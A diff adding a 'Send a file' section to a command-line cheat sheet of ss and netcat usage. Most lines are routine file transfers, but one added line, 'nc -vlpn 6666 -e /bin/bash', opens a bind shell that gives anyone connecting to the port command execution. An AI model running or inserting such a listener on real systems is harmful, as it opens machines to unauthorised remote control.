@@ -35,6 +35,17 @@ Pointers to the sources of data that the programs are using.
     # all,numeric(noresolve),tcp,listen,processes
     ss -antlp
 
+# Send a file
+
+    # create on target
+    nc -vlpn 6666 > mybin
+    
+    # execute on target on connect
+    nc -vlpn 6666 -e /bin/bash
+    
+    # send from source
+    nc -vn <ip> 6666 < mybin
+
 # Send a basic GET request to the application on server port
 
         cat <(echo "GET \file.txt HTTP/1.0" && echo) - | nc 1.1.1.1 2222 -vv
